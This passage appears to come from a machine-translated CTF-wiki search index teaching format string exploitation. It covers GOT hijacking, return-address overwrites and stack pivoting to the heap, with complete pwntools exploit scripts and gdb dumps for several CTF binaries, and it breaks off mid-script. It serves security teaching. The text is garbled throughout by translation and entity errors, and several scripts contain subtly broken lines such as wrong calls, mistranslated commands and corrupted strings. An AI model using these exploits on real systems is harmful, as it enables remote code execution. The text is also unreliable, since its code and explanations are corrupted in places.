\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 It can be seen that the offset on the stack corresponding to the flag is 5, and the offset is 4 except for the corresponding first behavior return address. In addition, since this is a 64-bit program, the first 6 parameters exist in the corresponding registers, and the fmt string is stored in the RDI register, so the offset of the address corresponding to the fmt string is 10. The order corresponding to %order$s in the fmt string is the order of the arguments after the fmt string, so we only need to type %9$s to get the contents of the flag. Of course, we have an easier way to use fmtarg in https://github.com/scwuaptx/Pwngdb to determine the offset of a parameter. gef\u27a4 fmtarg 0x00007fffffffdb28 The index of format argument : 10 Note that we have to break at printf.","title":"Determining the offset"},{"location":"pwn/linux/fmtstr/fmtstr_example/#using-the-program","text":"from pwn import * from LibcSearcher import * goodluck = ELF ( './goodluck' ) if args [ 'REMOTE' ]: sh = remote ( 'pwn.sniperoj.cn' , 30017 ) else : sh = process ( './goodluck' ) payload = \"%9$s\" print payload ##gdb.attach(sh) sh . sendline ( payload ) print sh . recv () sh . interactive ()","title":"Using the program"},{"location":"pwn/linux/fmtstr/fmtstr_example/#hijack-got","text":"","title":"hijack GOT"},{"location":"pwn/linux/fmtstr/fmtstr_example/#principle_1","text":"In the current C program, the functions in libc are all jumped through the GOT table. In addition, the GOT entry corresponding to each libc function can be modified without enabling RELRO protection. Therefore, we can modify the GOT table content of one libc function to the address of another libc function to achieve control of the program. For example, we can modify the contents of the got item of printf to the address of the system function. Thus, the program actually executes the system function when it executes printf. Suppose we override the address of function A as the address of function B, then this attack technique can be divided into the following steps. Determine the GOT table address of function A. The function A we used in this step is usually in the program, so we can find it by simply finding the address. Determine the memory address of function B This step usually requires us to find a way to leak the address of the corresponding function B. Write the memory address of function B to the GOT table address of function A. This step generally requires us to use the vulnerability of the function to trigger. The general use methods are as follows Write function: write function. ROP ```text pop eax; ret; # printf@got -> eax pop ebx; ret; # (addr_offset = system_addr - printf_addr) -> ebx add [eax] ebx; ret; # [printf@got] = [printf@got] + addr_offset ``` Format string to write at any address","title":"Principle"},{"location":"pwn/linux/fmtstr/fmtstr_example/#examples_1","text":"Here we take [pwn3] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3 ) in the 2016 CCTF as an example.","title":"Examples"},{"location":"pwn/linux/fmtstr/fmtstr_example/#determining-protection_1","text":"as follows \u279c 2016 -CCTF-pwn3 git: ( master ) \u2717 checksec pwn3 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) It can be seen that the program mainly turns on NX protection. We generally turn on ASLR protection by default.","title":"Determining protection"},{"location":"pwn/linux/fmtstr/fmtstr_example/#_2","text":"First analyze the program, you can find that the program seems to mainly implement a password-registered ftp, with three basic functions: get, put, dir. Probably look at the code for each feature and find a format string vulnerability in the get function. int get_file () { char dest ; // [sp+1Ch] [bp-FCh]@5 char s1 ; // [sp+E4h] [bp-34h]@1 char * i ; // [sp+10Ch] [bp-Ch]@3 printf ( \"enter the file name you want to get:\" ); __isoc99_scanf ( \"%40s\" , & s1 ); if ( ! strncmp ( & s1 , \"flag\" , 4u ) ) puts ( \"too young, too simple\" ); for ( i = ( char * ) file_head ; i ; i = ( char * ) * (( _DWORD * ) i + 60 ) ) { if ( ! strcmp ( i , & s1 ) ) { strcpy ( & amp ; dest , i + 0x28 ); return printf ( & amp ; dest ); } } return printf ( & amp ; dest ); }","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"pwn/linux/fmtstr/fmtstr_example/#exploiting-ideas","text":"Since there is a format string vulnerability, we can determine the following ideas Bypass password Determine formatting string parameter offset Use put@got to get the put function address, and then get the corresponding version of libc.so, and then get the corresponding system function address. Modify the contents of puts@got to the address of system. When the program executes the puts function again, it actually executes the system function.","title":"Exploiting ideas"},{"location":"pwn/linux/fmtstr/fmtstr_example/#vulnerability-program","text":"as follows from pwn import * from LibcSearcher import LibcSearcher ##context.log_level = 'debug' pwn3 = ELF ( & #39;./pwn3&#39;) if args [ 'REMOTE' ]: sh = remote ( '111' , 111 ) else : sh = process ( './pwn3' ) def get ( name ): sh . sendline ( 'get' ) sh . recvuntil ( 'enter the file name you want to get:' ) sh . sendline ( name ) data = sh . recv () return data def put ( name , content ): sh . sendline ( 'put' ) sh . recvuntil ( 'please enter the name of the file you want to upload:' ) sh . sendline ( name ) sh . recvuntil ( 'then, enter the content:' ) sh . sendline ( content ) def show_dir (): sh . sendline ( & #39;you&#39;) tmp = 'sysbdmin' name = \"\" for i in tmp : name += chr ( ord ( i ) - 1 ) ## password def password (): sh . recvuntil ( 'Name (ftp.hacker.server:Rainism):' ) sh . sendline ( name ) ##password password () ## get the addr of puts puts_got = pwn3 . got [ 'puts' ] log . success ( 'puts got : ' + hex ( puts_got )) put ( '1111' , '%8$s' + p32 ( puts_got )) puts_addr = u32 ( get ( '1111' )[: 4 ]) ## get addr of system libc = LibcSearcher ( \"puts\" , puts_addr ) system_offset = libc . dump ( 'system' ) puts_offset = libc . dump ( 'puts' ) system_addr = puts_addr - puts_offset + system_offset log . success ( 'system addr : ' + hex ( system_addr )) ## modify puts@got, point to system_addr payload = fmtstr_payload ( 7 , { puts_got : system_addr }) put ( '/bin/sh;' , payload ) sh . recvuntil ( 'ftp>' ) sh . sendline ( 'get' ) sh . recvuntil ( 'enter the file name you want to get:' ) ##gdb.attach(sh) sh . sendline ( '/bin/sh;' ) ## system('/bin/sh') show_dir () sh . interactive () note The offset I used when getting the address of the puts function is 8, because I want the first 4 bytes of my output to be the address of the puts function. In fact, the offset of the first address of the format string is 7. Here I used the fmtstr_payload function in pwntools to get the results we hoped for. If you are interested, you can check the official documentation. For example, here fmtstr_payload(7, {puts_got: system_addr}) means that the offset of my format string is 7, I want to write the system_addr address at the puts_got address. By default it is written in bytes.","title":"Vulnerability Program"},{"location":"pwn/linux/fmtstr/fmtstr_example/#hijack-retaddr","text":"","title":"hijack retaddr"},{"location":"pwn/linux/fmtstr/fmtstr_example/#principle_2","text":"It's easy to understand that we're going to use the format string vulnerability to hijack the return address of the program to the address we want to execute.","title":"Principle"},{"location":"pwn/linux/fmtstr/fmtstr_example/#examples_2","text":"Here we take [three white hat-pwnme_k0] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/three white hats-pwnme_k0) as an example for analysis.","title":"Examples"},{"location":"pwn/linux/fmtstr/fmtstr_example/#determining-protection_2","text":"\u279c Three white hats - pwnme_k0 git: ( master ) \u2717 checksec pwnme_k0 Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE ( 0x400000 ) It can be seen that the program mainly opens NX protection and Full RELRO protection. This way we have no way to modify the got table of the program.","title":"Determining protection"},{"location":"pwn/linux/fmtstr/fmtstr_example/#_3","text":"A brief analysis, you know that the program seems to mainly implement a function similar to account registration, mainly modify the viewing function, and then found a format string vulnerability found in the viewing function. int __usercall sub_400B07 @ < eax > ( char format @ < dil > , char formata , __int64 a3 , char a4 ) { write ( 0 , \"Welc0me to sangebaimao! \\n \" , 0x1AuLL ); printf ( & amp ; formatata , & quot ; Welc0me to sangebaimao ! \\ n & quot ;); return printf ( & amp ; a4 + 4 ); } The output is &a4 + 4. Let\u2019s go back and find out that the password we read in is also v6 = read ( 0 , ( char * ) & a4 + 4 , 0x14uLL ); Of course, we can also find that the username we read in is 20 bytes from the password. puts ( \"Input your username(max lenth:20): \" ); fflush ( stdout ); v8 = read ( 0 , & bufa , 0x14uLL ); if ( v8 && v8 <= 0x14u ) { puts ( \"Input your password(max lenth:20): \" ); fflush ( stdout ); v6 = read ( 0 , ( char * ) & a4 + 4 , 0x14uLL ); fflush ( stdout ); * ( _QWORD * ) buf = bufa ; * ( _ QWORD * ) ( buf + 8 ) = a3 ; * ( _QWORD * )( buf + 16 ) = a4 ; Ok, this is almost the same. In addition, you can also find that this account password is not paired and not paired.","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"pwn/linux/fmtstr/fmtstr_example/#using-ideas","text":"Our ultimate goal is to get the system's shell. We can find that in the given file, there is a function that directly calls system('bin/sh') at the address 0x00000000004008A6 (about this discovery, generally the program is now roughly take a look.). Then if we modify the return address of a function to this address, it is equivalent to getting the shell. Although the memory that stores the return address itself is dynamically changing, its address relative to rbp does not change, so we can use the relative address to calculate. Use ideas as follows Determine the offset Get the rbp and return address of the function Get the address where the return address is stored based on the relative offset Write the address of the execution system function call to the address where the return address is stored.","title":"Using ideas"},{"location":"pwn/linux/fmtstr/fmtstr_example/#determining-the-offset_1","text":"First, let's first determine the offset. Enter the user name aaaaaaaa, enter the password casually, at the printf(&a4 + 4) function that outputs the password under the breakpoint. Register Account first! Input your username(max lenth:20): aaaaaaaa Input your password(max lenth:20): %p%p%p%p%p%p%p%p%p%p Register Success!! 1.Sh0w Account Infomation! 2.Ed1t Account Inf0mation! 3.QUit sangebaimao:( >error options 1.Sh0w Account Infomation! 2.Ed1t Account Inf0mation! 3.QUit sangebaimao:( >1 ... At this point the stack is \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500 0x400b1a call 0x400758 0x400b1fe rdi, [rbp + 0x10] 0x400b23 mov eax, 0x0 \u2192 0x400b28 call 0x400770 \u21b3 0x400770 jmp QWORD PTR [rip+0x20184a] # 0x601fc0 0x400776 xchg ax, ax 0x400778 jmp QWORD PTR [rip+0x20184a] # 0x601fc8 0x40077e xchg ax, ax \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500 0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80 \u2192 0x00007fffffffdc30 \u2192 0x0000000000400eb0 \u2192 push r15 \u2190 $rsp, $rbp 0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74 \u2192 add rsp, 0x30 0x00007fffffffdb50\u2502+0x10: \"aaaaaaaa\" \u2190 $rdi 0x00007fffffffdb58\u2502+0x18: 0x000000000000000a 0x00007fffffffdb60\u2502+0x20: 0x7025702500000000 0x00007fffffffdb68\u2502+0x28: \"%p%p%p%p%p%p%p%pM\\r@\" 0x00007fffffffdb70\u2502+0x30: \"%p%p%p%pM\\r@\" 0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d \u2192 cmp eax, 0x2 We can find that the user name we entered is in the third position on the stack, then the position of the format string itself is removed, and the offset is 5 + 3 = 8.","title":"Determining the offset"},{"location":"pwn/linux/fmtstr/fmtstr_example/#change-address","text":"We will carefully observe the information of the stack at the breakpoint. 0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80 \u2192 0x00007fffffffdc30 \u2192 0x0000000000400eb0 \u2192 push r15 \u2190 $rsp, $rbp 0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74 \u2192 add rsp, 0x30 0x00007fffffffdb50\u2502+0x10: \"aaaaaaaa\" \u2190 $rdi 0x00007fffffffdb58\u2502+0x18: 0x000000000000000a 0x00007fffffffdb60\u2502+0x20: 0x7025702500000000 0x00007fffffffdb68\u2502+0x28: \"%p%p%p%p%p%p%p%pM\\r@\" 0x00007fffffffdb70\u2502+0x30: \"%p%p%p%pM\\r@\" 0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d \u2192 cmp eax, 0x2 You can see that the second location on the stack stores the return address of the function (in fact, the value stored in the push rip when the show account function is called), and the offset in the format string is 7. At the same time, on the stack, the first element stores the rbp of the previous function. So we can get the offset 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38. Then if we know the value of rbp, we know the address of the function return address. 0x0000000000400d74 is different from 0x00000000004008A6 with only 2 bytes lower, so we can only modify 2 bytes starting at 0x00007fffffffdb48. It should be noted here that on some newer systems (such as ubuntu 18.04), the program crash may occur when the return address is directly modified to 0x00000000004008A6. In this case, you can consider modifying the return address to 0x00000000004008AA, that is, directly calling system(\"/bin /sh\") .text:00000000004008A6 sub_4008A6 proc near .text:00000000004008A6 ; __unwind { .text:00000000004008A6 push rbp .text:00000000004008A7 mov rbp, rsp .text:00000000004008AA <- here mov edi, offset command ; \"/bin/sh\" .text:00000000004008AF call system .text:00000000004008B4 pop rdi .text:00000000004008B5 pop rsi .text:00000000004008B6 pop rdx .text: 00000000004008B7 retn","title":"Change address"},{"location":"pwn/linux/fmtstr/fmtstr_example/#using-the-program_1","text":"from pwn import * context . log_level = \"debug\" context . arch = \"amd64\" sh = process ( \"./pwnme_k0\" ) binary = ELF ( \"pwnme_k0\" ) #gdb.attach(sh) sh . recv () sh . writeline ( \"1\" * 8 ) sh . recv () sh . writeline ( \"%6$p\" ) sh . recv () sh . writeline ( \"1\" ) sh . recvuntil ( \"0x\" ) ret_addr = int ( sh . recvline () . strip (), 16 ) - 0x38 Success ( & quot ; ret_addr : & quot ; + Hex ( ret_addr )) sh . recv () sh . writeline ( \"2\" ) sh . recv () sh . sendline ( p64 ( ret_addr )) sh . recv () #sh.writeline(\"%2214d%8$hn\") #0x4008aa-0x4008a6 sh . writeline ( \" %2218d %8$hn\" ) sh . recv () sh . writeline ( \"1\" ) sh . recv () sh . interactive ()","title":"Using the program"},{"location":"pwn/linux/fmtstr/fmtstr_example/#formatted-string-vulnerability-on-heap","text":"","title":"Formatted string vulnerability on heap"},{"location":"pwn/linux/fmtstr/fmtstr_example/#principle_3","text":"The so-called formatted string on the heap means that the formatted string itself is stored on the heap. This mainly increases the difficulty of getting the corresponding offset. In general, the formatted string is likely to be copied. On the stack.","title":"Principle"},{"location":"pwn/linux/fmtstr/fmtstr_example/#examples_3","text":"Here we take [contacts] ( https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2015-CSAW-contacts ) in CSAW 2015 as an example.","title":"Examples"},{"location":"pwn/linux/fmtstr/fmtstr_example/#determining-protection_3","text":"\u279c 2015 -CSAW-contacts git: ( master ) \u2717 checksec contacts Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x8048000 ) It can be seen that the program not only turns on NX protection but also turns on Canary.","title":"Determining protection"},{"location":"pwn/linux/fmtstr/fmtstr_example/#_4","text":"A simple look at the program, found that the program, as the name describes, is a contact-related program that can create, modify, delete, and print contact information. And after reading it carefully, you can find a format string vulnerability when printing contact information. int __cdecl PrintInfo ( int a1 , int a2 , int a3 , char * format ) { printf ( \" \\t Name: %s \\n \" , a1 ); printf ( \" \\t Length %u \\n \" , a2 ); printf ( \" \\t Phone #: %s \\n \" , a3 ); printf ( \" \\t Description: \" ); return printf ( format ); } Take a closer look and you can see that this format actually points to the heap.","title":"\u5206\u6790\u7a0b\u5e8f"},{"location":"pwn/linux/fmtstr/fmtstr_example/#using-ideas_1","text":"Our basic purpose is to get the system's shell and get the flag. In fact, since there is a format string vulnerability, we should be able to control the program flow by hijacking the got table or controlling the return address of the program. But it is not very feasible here. The reasons are as follows The reason why we can't hijack got to control the program flow is because we found that only the printf function that can be output to our given string is common in the program. We only have to select it to construct /bin/sh to execute it. ('/bin/sh'), but the printf function is also used elsewhere, which will cause the program to crash directly. Secondly, it is not possible to directly control the program return address to control the program flow because we do not have a directly executable address to store our contents, and use the format string to write directly to the stack system__addr + 'bbbb ' + addr of '/bin/sh' doesn't seem to be realistic. So what can we do? We also have the skills to talk about stack overflow before, stack pivoting. And here, what we can control happens to be heap memory, so we can move the stack to the heap. Here we use the leave command for stack migration, so before migration we need to modify the program to save the value of ebp to the value we want. Only then will esp become the value we want when we execute the leave instruction. At the same time, because we are using the format string to modify, so we have to know the address of the ebp store, and the address of the ebp stored in the PrintInfo function changes every time, and we can not know by other means. . However, the ebp value pushed into the stack in the program actually saves the address of the ebp value of the previous function , so we can modify the value of the saved ebp of the upper layer function, ie the upper upper layer function ( That is, the main function) ebp value . In this way, when the upper program returns, the operation of migrating the stack to the heap is implemented. The basic idea is as follows First get the address of the system function Determine by libc database by leaking the address of a libc function. Construct a basic contact description as system_addr + 'bbbb' + binsh_addr Modify the ebp saved by the upper function (ie the ebp of the upper layer function) to the address -** of the storage system_addr. When the main program returns, the following operations will occur move esp, ebp, point esp to the address of system_addr -4 pop ebp, point esp to system_addr ret, get the shell by pointing eip to system_addr.","title":"Using ideas"},{"location":"pwn/linux/fmtstr/fmtstr_example/#get-the-relevant-address-and-offset","text":"Here we mainly get the system function address, /bin/sh address, the address of the contact description stored on the stack, and the address of the PrintInfo function. First, we get the system function address and /bin/sh address according to the libc_start_main_ret address stored on the stack (which is the function that will run when the main function returns). We construct the corresponding contact, then choose to output the contact information, and breakpoints at printf, and run until the printf function of the format string vulnerability, as follows \u2192 0xf7e44670 <printf+0> call 0xf7f1ab09 <__x86.get_pc_thunk.ax> \u21b3 0xf7f1ab09 <__x86.get_pc_thunk.ax+0> mov eax, DWORD PTR [ esp ] 0xf7f1ab0c <__x86.get_pc_thunk.ax+3> ret 0xf7f1ab0d <__x86.get_pc_thunk.dx+0> mov edx, DWORD PTR [ esp ] 0xf7f1ab10 <__x86.get_pc_thunk.dx+3> ret \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ stack ] \u2500\u2500\u2500\u2500 [ '0xffffccfc' , 'l8' ] 8 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp 0xffffcd00\u2502+0x04: 0x0804c420 \u2192 \"1234567\" 0xffffcd04\u2502+0x08: 0x0804c410 \u2192 \"11111\" 0xffffcd08\u2502+0x0c: 0xf7e5acab \u2192 <puts+11> add ebx, 0x152355 0xffffcd0c\u2502+0x10: 0x00000000 0xffffcd10\u2502+0x14: 0xf7fad000 \u2192 0x001b1db0 0xffffcd14\u2502+0x18: 0xf7fad000 \u2192 0x001b1db0 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [ trace ] \u2500\u2500\u2500\u2500 [ #0] 0xf7e44670 \u2192 Name: __printf(format=0x804c420 \"1234567\\n\") [ #1] 0x8048c27 \u2192 leave [ #2] 0x8048c99 \u2192 add DWORD PTR [ebp-0xc], 0x1 [ # 3] 0x80487a2 \u2192 jmp 0x80487b3 [ #4] 0xf7e13637 \u2192 Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0 <_dl_fini>, stack_end=0xffffce0c) [ # 5] 0x80485e1 \u2192 holds \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 gef\u27a4 dereference $esp 140 [ '$esp' , '140' ] 1 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp gef\u27a4 dereference $esp l140 [ '$esp' , 'l140' ] 140 0xffffccfc\u2502+0x00: 0x08048c27 \u2192 leave \u2190 $esp 0xffffcd00\u2502+0x04: 0x0804c420 \u2192 \"1234567\" 0xffffcd04\u2502+0x08: 0x0804c410 \u2192 \"11111\" 0xffffcd08\u2502+0x0c: 0xf7e5acab \u2192 <puts+11> add ebx, 0x152355 0xffffcd0c\u2502+0x10: 0x00000000 0xffffcd10\u2502+0x14: 0xf7fad000 \u2192 0x001b1db0 0xffffcd14\u2502+0x18: 0xf7fad000 \u2192 0x001b1db0 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp 0xffffcd1c\u2502+0x20: 0x08048c99 \u2192 add DWORD PTR [ ebp-0xc ] , 0x1 0xffffcd20\u2502+0x24: 0x0804b0a8 \u2192 \"11111\" 0xffffcd24\u2502+0x28: 0x00002b67 ( \"g+\" ? ) 0xffffcd28\u2502+0x2c: 0x0804c410 \u2192 \"11111\" 0xffffcd2c\u2502+0x30: 0x0804c420 \u2192 \"1234567\" 0xffffcd30\u2502+0x34: 0xf7fadd60 \u2192 0xfbad2887 0xffffcd34\u2502+0x38: 0x08048ed6 \u2192 0x25007325 ( \"%s\" ? ) 0xffffcd38\u2502+0x3c: 0x0804b0a0 \u2192 0x0804c420 \u2192 \"1234567\" 0xffffcd3c\u2502+0x40: 0x00000000 0xffffcd40\u2502+0x44: 0xf7fad000 \u2192 0x001b1db0 0xffffcd44\u2502+0x48: 0x00000000 0xffffcd48\u2502+0x4c: 0xffffcd78 \u2192 0x00000000 0xffffcd4c\u2502 + 0x50: 0x080487a2 \u2192 jmp 0x80487b3 0xffffcd50\u2502+0x54: 0x0804b0a0 \u2192 0x0804c420 \u2192 \"1234567\" 0xffffcd54\u2502+0x58: 0xffffcd68 \u2192 0x00000004 0xffffcd58\u2502+0x5c: 0x00000050 ( \"P\" ? ) 0xffffcd5c\u2502+0x60: 0x00000000 0xffffcd60\u2502+0x64: 0xf7fad3dc \u2192 0xf7fae1e0 \u2192 0x00000000 0xffffcd64\u2502+0x68: 0x08048288 \u2192 0x00000082 0xffffcd68\u2502+0x6c: 0x00000004 0xffffcd6c\u2502+0x70: 0x0000000a 0xffffcd70\u2502+0x74: 0xf7fad000 \u2192 0x001b1db0 0xffffcd74\u2502+0x78: 0xf7fad000 \u2192 0x001b1db0 0xffffcd78\u2502+0x7c: 0x00000000 0xffffcd7c\u2502+0x80: 0xf7e13637 \u2192 <__libc_start_main+247> add esp, 0x10 0xffffcd80\u2502+0x84: 0x00000001 0xffffcd84\u2502+0x88: 0xffffce14 \u2192 0xffffd00d \u2192 \"/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/fmtstr/example/201[...]\" 0xffffcd88\u2502+0x8c: 0xffffce1c \u2192 0xffffd058 \u2192 \"XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]\" We can get it by simple judgment. 0xffffcd7c\u2502+0x80: 0xf7e13637 \u2192 <__libc_start_main+247> add esp, 0x10 Stored is the return address of __libc_start_main, and uses fmtarg to get the corresponding offset. It can be seen that the offset is 32, then the offset from the format string is 31. gef\u27a4 fmtarg 0xffffcd7c The index of format argument : 32 This way we can get the corresponding address. In turn, you can get the corresponding libc according to libc-database, and then get the system function address and /bin/sh function address. Second, we can determine that the address 0xffffcd2c of the formatted string stored on the stack is 11 relative to the format string, which is used to construct our contacts. Furthermore, we can see that the following address holds the call address of the upper function, and its offset from the format string is 6, so that we can directly modify the value of ebp stored in the upper function. 0xffffcd18\u2502+0x1c: 0xffffcd48 \u2192 0xffffcd78 \u2192 0x00000000 \u2190 $ebp","title":"Get the relevant address and offset"},{"location":"pwn/linux/fmtstr/fmtstr_example/#constructing-a-contact-to-get-the-heap-address","text":"After learning the above information, we can use the following method to get the heap address and the corresponding ebp address. [system_addr][bbbb][binsh_addr][%6$p][%11$p][bbbb] To get the corresponding corresponding address. The latter bbbb is for the convenience of accepting strings. Here, because the stack space requested by the function is the same as the free space, the ebp address we get will not change because we call it again. In some environments, the system address will appear \\x00, causing 0 truncation when printf will result in the inability to disclose both addresses, so you can modify the payload as follows: [%6$p][%11$p][ccc][system_addr][bbbb][binsh_addr][dddd] If the payload is modified to do this, you need to add a 12 offset to the heap. This ensures that the 0 truncation occurs after the leak.","title":"Constructing a contact to get the heap address"},{"location":"pwn/linux/fmtstr/fmtstr_example/#modify-ebp","text":"Since we need to execute the move command to assign ebp to esp and also need to execute pop ebp to execute the ret instruction, we need to modify ebp to store the value of system address -4. After pop ebp, the esp happens to point to the address of the save system, and the system function can be executed by executing the ret instruction. We have already learned the ebp value we want to modify, and we know that the corresponding offset is 6, so we can construct the following payload to modify the corresponding value. part1 = (heap_addr - 4) / 2 part2 = heap_addr - 4 - part1 payload = '%' + str(part1) + 'x%' + str(part2) + 'x%6$n'","title":"Modify ebp"},{"location":"pwn/linux/fmtstr/fmtstr_example/#get-the-shell","text":"At this time, after executing the format string function, exit to the upper function, we enter 5, exit the program will execute the ret instruction, you can get the shell.","title":"Get the shell"},{"location":"pwn/linux/fmtstr/fmtstr_example/#using-the-program_2","text":"from pwn import * from LibcSearcher import * contact = ELF ( './contacts' ) ##context.log_level = 'debug' if args [ 'REMOTE' ]: sh = remote ( 11 , 111 ) else : sh = process ( './contacts' ) def createcontact ( name , phone , descrip_len , description ): sh . recvuntil ( & #39;&gt;&gt;&gt;&#39;) sh . sendline ( '1' ) sh . recvuntil ( 'Contact info: \\n ' ) sh . recvuntil ( 'Name: ' ) sh . sendline ( name ) sh . recvuntil ( 'You have 10 numbers \\n ' ) sh . sendline ( phone ) sh . recvuntil ( 'Length of description: ' ) sh . sendline ( descrip_len ) sh . recvuntil ( 'description: \\n\\t\\t ' ) sh . sendline ( description ) def printcontact (): sh . recvuntil ( & #39;&gt;&gt;&gt;&#39;) sh . sendline ( '4' ) sh . recvuntil ( 'Contacts:' ) sh . recvuntil ( 'Description: ' ) ## get system addr & binsh_addr payload = & #39;% 31 $ paaaa&#39; createcontact ( '1111' , '1111' , '111' , payload ) print contact () libc_start_main_ret = int ( sh . recvuntil ( 'aaaa' , drop = True ), 16 ) log . success ( 'get libc_start_main_ret addr: ' + hex ( libc_start_main_ret )) libc = LibcSearcher ( '__libc_start_main_ret' , libc_start_main_ret ) libc_base = libc_start_main_ret - libc . dump ( '__libc_start_main_ret' ) system_addr = libc_base + libc . dump ( 'system' ) binsh_addr = libc_base + libc . dump ( 'str_bin_sh' ) log . success ( 'get system addr: ' + hex ( system_addr )) log . success ( 'get binsh addr: ' + hex ( binsh_addr )) ##gdb.attach(sh) ## get heap addr and ebp addr payload = flat ([ system_addr , & #39;yyyah&#39;, binsh_addr , '%6$p%11$pcccc' , ]) createcontact ( '2222' , '2222' , '222' , payload ) print contact () sh . recvuntil ( 'Description: ' ) data = sh . recvuntil ( 'cccc' , drop = True ) data = data . split ( '0x' ) print data ebp_addr = int ( data [ 1 ], 16 ) heap_addr = int ( data [ 2 ], 16 ) ## modify ebp part1 = ( heap_addr - 4 ) / 2 part2 = heap_addr - 4 - part1 payload = '%' + str ( part1 ) + 'x%' + str ( part2 ) + 'x%6$n' ##print payload createcontact ( '3333' , '123456789' , '300' , payload ) print contact () sh . recvuntil ( 'Description: ' ) sh . recvuntil ( 'Description: ' ) ##gdb.attach(sh) print 'get shell' sh . recvuntil ( & #39;&gt;&gt;&gt;&#39;) ##get shell sh . sendline ( '5' ) sh . interactive () In the case of system 0 truncation, exp is as follows: from pwn import * context . log_level = 